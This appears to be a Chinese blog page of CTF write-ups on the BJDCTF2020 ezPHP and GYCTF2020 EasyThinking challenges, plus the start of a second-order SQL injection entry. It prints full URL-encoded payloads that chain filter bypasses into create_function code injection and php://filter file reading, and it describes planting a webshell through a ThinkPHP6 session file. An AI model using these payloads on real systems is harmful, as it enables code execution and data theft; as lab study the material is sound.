&lt;pre&gt;&lt;code&gt;if($_SERVER) &amp;#123; 
    if (
//几乎ban掉了payload里所有可能用到的词        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&amp;quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])
        )  
        die(&#39;You seem to want to do something bad?&#39;); 
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;_serverquery_string函数不对传入的东西进行url编码所以把payload进行url编码之后传入即可绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_serverquery_string函数不对传入的东西进行url编码所以把payload进行url编码之后传入即可绕过&#34;&gt;#&lt;/a&gt; $_SERVER [‘QUERY_STRING’] 函数不对传入的东西进行 url 编码，所以把 payload 进行 url 编码之后传入即可绕过&lt;/h5&gt;
&lt;p&gt;(ps: 一般的 url 编码不能把英文字母等非特殊字符也编码，所以本题中如果只是把 payload 丢到编码器里没有用，但我也只找到这个师傅说了对应的解决办法&lt;/p&gt;
&lt;h6 id=&#34;英语字符的url编码就是在字符的十六进制前面加了个百分号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#英语字符的url编码就是在字符的十六进制前面加了个百分号&#34;&gt;#&lt;/a&gt; 英语字符的 url 编码就是在字符的十六进制前面加了个百分号&lt;/h6&gt;
&lt;h4 id=&#34;2preg_match绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2preg_match绕过&#34;&gt;#&lt;/a&gt; 2.preg_match 绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;]))
//不能包含http|https
&amp;#123;
    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;])&amp;amp;&amp;amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)
 //需要在debu=xxx中匹配到‘/^&amp;amp;/’，且debu不能为‘aqua_is_cute’
    &amp;#123; 
        $file = $_GET[&amp;quot;file&amp;quot;]; //用file=xxx传值
        echo &amp;quot;Neeeeee! Good Job!&amp;lt;br&amp;gt;&amp;quot;;
    &amp;#125; 
&amp;#125; else die(&#39;fxck you! What do you want to do ?!&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;是正则匹配表示以xxx开头表示以xxx结尾现在需要绕过preg_match所以在deduaqua_is_cute末尾加上换行也就是加上0a&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#是正则匹配表示以xxx开头表示以xxx结尾现在需要绕过preg_match所以在deduaqua_is_cute末尾加上换行也就是加上0a&#34;&gt;#&lt;/a&gt; &#39;/^&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mtext&gt;是正则匹配&lt;/mtext&gt;&lt;msup&gt;&lt;mtext&gt;，&lt;/mtext&gt;&lt;mtext&gt;表&lt;/mtext&gt;&lt;/msup&gt;&lt;mtext&gt;示以&lt;/mtext&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mtext&gt;开头，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;/&amp;#x27;是正则匹配，^表示以xxx开头，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0913309999999998em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;正&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;则&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;匹&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;配&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord cjk_fallback mtight&#34;&gt;表&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;示&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;以&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;开&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;头&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示以 xxx 结尾，现在需要绕过 preg_match，所以在 dedu=aqua_is_cute 末尾加上换行（也就是加上 %0a）&lt;/h5&gt;
&lt;h4 id=&#34;3_request绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3_request绕过&#34;&gt;#&lt;/a&gt; 3.$_REQUEST 绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if($_REQUEST) &amp;#123; 
    foreach($_REQUEST as $value) &amp;#123; 
        if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value)) 
        //要求不能有字母
            die(&#39;fxck you! I hate English!&#39;); 
    &amp;#125; 
&amp;#125; 
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$_POST优先级高于$_GET,所以用POST传入的值会把$_GET中的值覆盖掉
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;4file_get_contents绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4file_get_contents绕过&#34;&gt;#&lt;/a&gt; 4.file_get_contents 绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)
    die(&amp;quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&amp;lt;br&amp;gt;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;此处用data伪协议即可绕过datatextplain~&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#此处用data伪协议即可绕过datatextplain~&#34;&gt;#&lt;/a&gt; 此处用 data 伪协议即可绕过（data://text/plain,~）&lt;/h5&gt;
&lt;h4 id=&#34;5sha1函数-比较类型数组绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5sha1函数-比较类型数组绕过&#34;&gt;#&lt;/a&gt; 5.sha1 函数、比较类型数组绕过&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if ( sha1($shana) === sha1($passwd) &amp;amp;&amp;amp; $shana != $passwd )
//既要shana和passwd传入的值不相同，又要这两个传入的值经过sha1散列之后强相等
&amp;#123;
    extract($_GET[&amp;quot;flag&amp;quot;]);
    echo &amp;quot;Very good! you know my password. But what is flag?&amp;lt;br&amp;gt;&amp;quot;;
&amp;#125; else&amp;#123;
    die(&amp;quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&amp;quot;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;sha1函数对数组不敏感所以用shana0passwd1绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sha1函数对数组不敏感所以用shana0passwd1绕过&#34;&gt;#&lt;/a&gt; sha1 函数对数组不敏感，所以用 shana []=0&amp;amp;passwd []=1 绕过&lt;/h5&gt;
&lt;h5 id=&#34;至此为止满足以上五个条件的payload是&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#至此为止满足以上五个条件的payload是&#34;&gt;#&lt;/a&gt; // 至此为止，满足以上五个条件的 payload 是：&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;file=data://text/plain,debu_debu_aque&amp;amp;debu=aque_is_cute%0a&amp;amp;shana[]=0&amp;amp;passwd[]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;url 编码后就是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;amp;%73%68%61%6e%61[]=1&amp;amp;%70%61%73%73%77%64[]=2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同时 POST 传入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=1&amp;amp;debu=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样就是最后一个绕过：&lt;/p&gt;
&lt;h4 id=&#34;6create_function运用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6create_function运用&#34;&gt;#&lt;/a&gt; 6.create_function 运用：&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 
preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&amp;#123;|\%|x|\&amp;amp;|\$|\*|\||\&amp;lt;|\&amp;quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) 
//ban了这么这么多，肯定不能用一般方法传入payload了
&amp;#123; 
    die(&amp;quot;&amp;lt;br /&amp;gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&amp;quot;); 
&amp;#125; else &amp;#123; 
    include &amp;quot;flag.php&amp;quot;;//包含了flag.php这个文件
    $code(&#39;&#39;, $arg);
&amp;#125; ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;code 和 arg 是可更改变量，所以在这两个东西上下功夫&lt;/p&gt;
&lt;h5 id=&#34;61由第5步中extract函数可见需要通过flagargxxxflagcodexxx传参&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#61由第5步中extract函数可见需要通过flagargxxxflagcodexxx传参&#34;&gt;#&lt;/a&gt; 6.1 由第 5 步中（extract 函数可见，需要通过 flag [arg]=xxx，flag [code]=xxx 传参&lt;/h5&gt;
&lt;h5 id=&#34;62利用create_function对于&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#62利用create_function对于&#34;&gt;#&lt;/a&gt; 6.2 利用 create_function, 对于&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;$aaa = create_function(&#39;$a, $b&#39;, &#39;return $a+$b;&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function aaa($a, $b)&amp;#123;
    return $a+$b;
&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$code=return $a+$b;&amp;#125;fction();//
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function aaa($a, $b)&amp;#123;
    return $a+$b;
&amp;#125;  
fction();//&amp;#125;（fction为某个任意函数，&amp;quot;//&amp;quot;可以注释掉后面的内容）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;应用到本题，可以得到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flag[code]=create_function&amp;amp;flag[arg]=&amp;#125;fction();//
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;63由于包含了flagphp这个文件为了查看所以用到两个函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#63由于包含了flagphp这个文件为了查看所以用到两个函数&#34;&gt;#&lt;/a&gt; 6.3 由于包含了 flag.php 这个文件，为了查看所以用到两个函数&lt;/h5&gt;
&lt;p&gt;var_dump：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24udmFyLWR1bXAucGhw&#34;&gt;https://www.php.net/manual/zh/function.var-dump.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;get_defined_vars()：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29kZXJjdG8uY29tL2NvdXJzZXMvZC84NjMuaHRtbA==&#34;&gt;https://www.codercto.com/courses/d/863.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可以利用 &lt;code&gt;get_defined_vars()&lt;/code&gt;  将所有变量和值都进行输出&lt;/p&gt;
&lt;p&gt;所以构造 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flag[code]=create_function&amp;amp;flag[arg]=&amp;#125;var_dump(get_defined_vars());//
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;64字母和数字都被ban了所以跟前面一样用url编码一下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#64字母和数字都被ban了所以跟前面一样用url编码一下&#34;&gt;#&lt;/a&gt; 6.4 字母和数字都被 ban 了，所以跟前面一样，用 url 编码一下&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;amp;%73%68%61%6e%61[]=1&amp;amp;%70%61%73%73%77%64[]=2&amp;amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;amp;%66%6c%61%67%5b%61%72%67%5d=&amp;#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POST 传参：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=1&amp;amp;debu=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;65提示了flag在rea1fl4gphp里所以考虑用require函数phpfilter读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#65提示了flag在rea1fl4gphp里所以考虑用require函数phpfilter读取文件&#34;&gt;#&lt;/a&gt; 6.5 提示了 flag 在 rea1fl4g.php 里，所以考虑用 require 函数，php//filter 读取文件&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;url 编码之后&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用异或或者～进行取反操作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;替换上一步中的 var_dump (get_defined_vars ())&lt;/p&gt;
&lt;p&gt;最终最终的 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;amp;%73%68%61%6e%61[]=1&amp;amp;%70%61%73%73%77%64[]=2&amp;amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;amp;%66%6c%61%67%5b%61%72%67%5d=&amp;#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))
;//
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POST 传参：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=1&amp;amp;debu=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBJDCTF2020%5DezPHP/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得 flag！&lt;/p&gt;

 &lt;h2 id=&#34;gyctf2020easythinking&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gyctf2020easythinking&#34;&gt;#&lt;/a&gt; [GYCTF2020]EasyThinking&lt;/h2&gt;
&lt;p&gt;先是源码泄露 www,zip&lt;/p&gt;
&lt;h2 id=&#34;2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BGYCTF2020%5DEasyThinking/2.png&#34; alt=&#34;2&#34;&gt;&lt;/h2&gt;
&lt;p&gt;登录后，少写一个字，发现是 thinkphp（题目的名字也提醒了是这个考点）&lt;/p&gt;
&lt;p&gt;在 web/home/controller 有一个 Member.php，得到网页源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
namespace app\home\controller;

use think\exception\ValidateException;
use think\facade\Db;
use think\facade\View;
use app\common\model\User;
use think\facade\Request;
use app\common\controller\Auth;

class Member extends Base
&amp;#123;

    public function index()
    &amp;#123;
        if (session(&amp;quot;?UID&amp;quot;))
        &amp;#123;
            $data = [&amp;quot;uid&amp;quot; =&amp;gt; session(&amp;quot;UID&amp;quot;)];
            $record = session(&amp;quot;Record&amp;quot;);
            $recordArr = explode(&amp;quot;,&amp;quot;, $record);
            $username = Db::name(&amp;quot;user&amp;quot;)-&amp;gt;where($data)-&amp;gt;value(&amp;quot;username&amp;quot;);
            return View::fetch(&#39;member/index&#39;,[&amp;quot;username&amp;quot; =&amp;gt; $username,&amp;quot;record_list&amp;quot; =&amp;gt; $recordArr]);
        &amp;#125;
        return view(&#39;member/index&#39;,[&amp;quot;username&amp;quot; =&amp;gt; &amp;quot;Are you Login?&amp;quot;,&amp;quot;record_list&amp;quot; =&amp;gt; &amp;quot;&amp;quot;]);
    &amp;#125;

    public function login()
    &amp;#123;
        if (Request::isPost())&amp;#123;
            $username = input(&amp;quot;username&amp;quot;);
            $password = md5(input(&amp;quot;password&amp;quot;));
            $data[&amp;quot;username&amp;quot;] = $username;
            $data[&amp;quot;password&amp;quot;] = $password;
            $userId = Db::name(&amp;quot;user&amp;quot;)-&amp;gt;where($data)-&amp;gt;value(&amp;quot;uid&amp;quot;);
            $userStatus = Db::name(&amp;quot;user&amp;quot;)-&amp;gt;where($data)-&amp;gt;value(&amp;quot;status&amp;quot;);
            if ($userStatus == 1)&amp;#123;
                return &amp;quot;&amp;lt;script&amp;gt;alert(\&amp;quot;该用户已被禁用，无法登陆\&amp;quot;);history.go(-1)&amp;lt;/script&amp;gt;&amp;quot;;
            &amp;#125;
            if ($userId)&amp;#123;
                session(&amp;quot;UID&amp;quot;,$userId);
                return redirect(&amp;quot;/home/member/index&amp;quot;);
            &amp;#125;
            return &amp;quot;&amp;lt;script&amp;gt;alert(\&amp;quot;用户名或密码错误\&amp;quot;);history.go(-1)&amp;lt;/script&amp;gt;&amp;quot;;

        &amp;#125;else&amp;#123;
            return view(&#39;login&#39;);
        &amp;#125;
    &amp;#125;

    public function register()
    &amp;#123;
        if (Request::isPost())&amp;#123;
            $data = input(&amp;quot;post.&amp;quot;);
            if (!(new Auth)-&amp;gt;validRegister($data))&amp;#123;
                return &amp;quot;&amp;lt;script&amp;gt;alert(\&amp;quot;当前用户名已注册\&amp;quot;);history.go(-1)&amp;lt;/script&amp;gt;&amp;quot;;
            &amp;#125;
            $data[&amp;quot;password&amp;quot;] = md5($data[&amp;quot;password&amp;quot;]);
            $data[&amp;quot;status&amp;quot;] = 0;
            $res = User::create($data);
            if ($res)&amp;#123;
                return redirect(&#39;/home/member/login&#39;);
            &amp;#125;
            return &amp;quot;&amp;lt;script&amp;gt;alert(\&amp;quot;注册失败\&amp;quot;);history.go(-1)&amp;lt;/script&amp;gt;&amp;quot;;
        &amp;#125;else&amp;#123;
            return View(&amp;quot;register&amp;quot;);
        &amp;#125;
    &amp;#125;

    public function logout()
    &amp;#123;
        session(&amp;quot;UID&amp;quot;,NULL);

        return &amp;quot;&amp;lt;script&amp;gt;location.href=&#39;/home/member/login&#39;&amp;lt;/script&amp;gt;&amp;quot;;
    &amp;#125;

    public function updateUser()
    &amp;#123;
        $data = input(&amp;quot;post.&amp;quot;);
        $update = Db::name(&amp;quot;user&amp;quot;)-&amp;gt;where(&amp;quot;uid&amp;quot;,session(&amp;quot;UID&amp;quot;))-&amp;gt;update($data);
        if($update)&amp;#123;
            return json([&amp;quot;code&amp;quot; =&amp;gt; 1, &amp;quot;msg&amp;quot; =&amp;gt; &amp;quot;修改成功&amp;quot;]);
        &amp;#125;
        return json([&amp;quot;code&amp;quot; =&amp;gt; 0, &amp;quot;msg&amp;quot; =&amp;gt; &amp;quot;修改失败&amp;quot;]);
    &amp;#125;

    public function rePassword()
    &amp;#123;
        $oldPassword = input(&amp;quot;oldPassword&amp;quot;);
        $password = input(&amp;quot;password&amp;quot;);
        $where[&amp;quot;uid&amp;quot;] = session(&amp;quot;UID&amp;quot;);
        $where[&amp;quot;password&amp;quot;] = md5($oldPassword);
        $res = Db::name(&amp;quot;user&amp;quot;)-&amp;gt;where($where)-&amp;gt;find();
        if ($res)&amp;#123;
            $rePassword = User::update([&amp;quot;password&amp;quot; =&amp;gt; md5($password)],[&amp;quot;uid&amp;quot;=&amp;gt; session(&amp;quot;UID&amp;quot;)]);
            if ($rePassword)&amp;#123;
                return json([&amp;quot;code&amp;quot; =&amp;gt; 1, &amp;quot;msg&amp;quot; =&amp;gt; &amp;quot;修改成功&amp;quot;]);
            &amp;#125;
            return json([&amp;quot;code&amp;quot; =&amp;gt; 0, &amp;quot;msg&amp;quot; =&amp;gt; &amp;quot;修改失败&amp;quot;]);
        &amp;#125;
        return json([&amp;quot;code&amp;quot; =&amp;gt; 0, &amp;quot;msg&amp;quot; =&amp;gt; &amp;quot;原密码错误&amp;quot;]);
    &amp;#125;

    public function search()
    &amp;#123;
        if (Request::isPost())&amp;#123;
            if (!session(&#39;?UID&#39;))
            &amp;#123;
                return redirect(&#39;/home/member/login&#39;);            
            &amp;#125;
            $data = input(&amp;quot;post.&amp;quot;);
            $record = session(&amp;quot;Record&amp;quot;);
            if (!session(&amp;quot;Record&amp;quot;))
            &amp;#123;
                session(&amp;quot;Record&amp;quot;,$data[&amp;quot;key&amp;quot;]);
            &amp;#125;
            else
            &amp;#123;
                $recordArr = explode(&amp;quot;,&amp;quot;,$record);
                $recordLen = sizeof($recordArr);
                if ($recordLen &amp;gt;= 3)&amp;#123;
                    array_shift($recordArr);
                    session(&amp;quot;Record&amp;quot;,implode(&amp;quot;,&amp;quot;,$recordArr) . &amp;quot;,&amp;quot; . $data[&amp;quot;key&amp;quot;]);
                    return View::fetch(&amp;quot;result&amp;quot;,[&amp;quot;res&amp;quot; =&amp;gt; &amp;quot;There&#39;s nothing here&amp;quot;]);
                &amp;#125;

            &amp;#125;
            session(&amp;quot;Record&amp;quot;,$record . &amp;quot;,&amp;quot; . $data[&amp;quot;key&amp;quot;]);
            return View::fetch(&amp;quot;result&amp;quot;,[&amp;quot;res&amp;quot; =&amp;gt; &amp;quot;There&#39;s nothing here&amp;quot;]);
        &amp;#125;else&amp;#123;
            return View(&amp;quot;search&amp;quot;);
        &amp;#125;
    &amp;#125;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;审计代码发现了 session：ThinkPhP6 会默认在 /runtime/session 创建一个 sess_xxxx 格式的 session 文件，这里的 xxxx 就是 PHPSESSID（32 位），而文件的内容就是 session 的内容，也就是 key 的内容。并且发现了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if ($userId)&amp;#123;
                session(&amp;quot;UID&amp;quot;,$userId);
                return redirect(&amp;quot;/home/member/index&amp;quot;);
            &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里把 uid 写入当前的 session 中，即我们本来构造的 PHPSESSID=1111111111111111111111111111.php 的 session 是没有 uid 的，没办法实现 search 功能，这里可以把 uid 赋给 session，即可以在搜索页面写入马（都要放包那里修改并且放包，这样才会上传马）&lt;br&gt;
&lt;img data-src=&#34;../images/%5BGYCTF2020%5DEasyThinking/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;先是穿上 sessionid 为 1111111111111111111111111111.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGYCTF2020%5DEasyThinking/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;再是传马上去，路径为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://0e4b69f8-bf90-4398-bf2d-d7fda1d4bbfd.node5.buuoj.cn:81/runtime/session/sess_1111111111111111111111111111.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;连上之后就用蚁剑连接；但是还有个 disable_function 绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGYCTF2020%5DEasyThinking/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGYCTF2020%5DEasyThinking/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得 flag&lt;/p&gt;

 &lt;h2 id=&#34;october-2019-twice-sql-injection&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#october-2019-twice-sql-injection&#34;&gt;#&lt;/a&gt; October 2019 Twice SQL Injection&lt;/h2&gt;
&lt;p&gt;二次注入（个人理解二次注入不是立马生效，而是在另一个界面时被调用，SQL 语句在那个界面被调用生效）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/October2019TwiceSQLInjection/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行注册；&lt;/p&gt;
